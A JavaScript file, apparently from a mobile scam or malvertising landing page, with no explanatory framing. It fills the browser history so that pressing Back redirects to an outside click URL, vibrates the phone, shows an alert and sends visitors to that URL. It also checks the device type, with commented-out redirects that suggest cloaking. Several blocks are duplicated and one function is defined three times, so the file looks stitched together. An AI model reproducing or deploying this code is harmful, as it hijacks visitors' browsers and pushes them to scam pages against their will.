var parameters = location.href.split('?')[1];
makeAlert()

if (typeof window.orientation == 'undefined') {
  //document.location="/wgray/";
}

function is_touch_device() {
  return 'ontouchstart' in window // works on most browsers
    || 'onmsgesturechange' in window; // works on ie10
};
if ((is_touch_device() || (window.screen.availHeight + window.screen.availWidth) < 1700) && navigator.plugins.length == 0) {} else {
  //window.location.replace("/wgray/");
}
var parameters = location.href.split('?')[1];
var defaultModel = 'phone';

function getURLParameter(name) {
  if (location.search.indexOf(name) == -1) return defaultModel;
  var model = decodeURI(
    (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
  if (model == undefined || model == '') return defaultModel;
  return model;
}

function getURLParameter(name) {
  return decodeURI(
    (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
}! function() {
  var t;
  try {
    for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
    onpopstate = function(t) {
      t.state && location.replace("http://you.goouturl.com/click")
    }
  } catch (o) {}
}();
navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
navigator.vibrate([1000]);

function goto() {
  location.href = "http://you.goouturl.com/click"
}

function getURLParameter(name) {
  return decodeURI(
    (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
}! function() {
  var t;
  try {
    for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
    onpopstate = function(t) {
      t.state && location.replace("http://you.goouturl.com/click")
    }
  } catch (o) {}
}();
navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
navigator.vibrate([1000]);

function goto() {
  location.href = "http://you.goouturl.com/click"
}
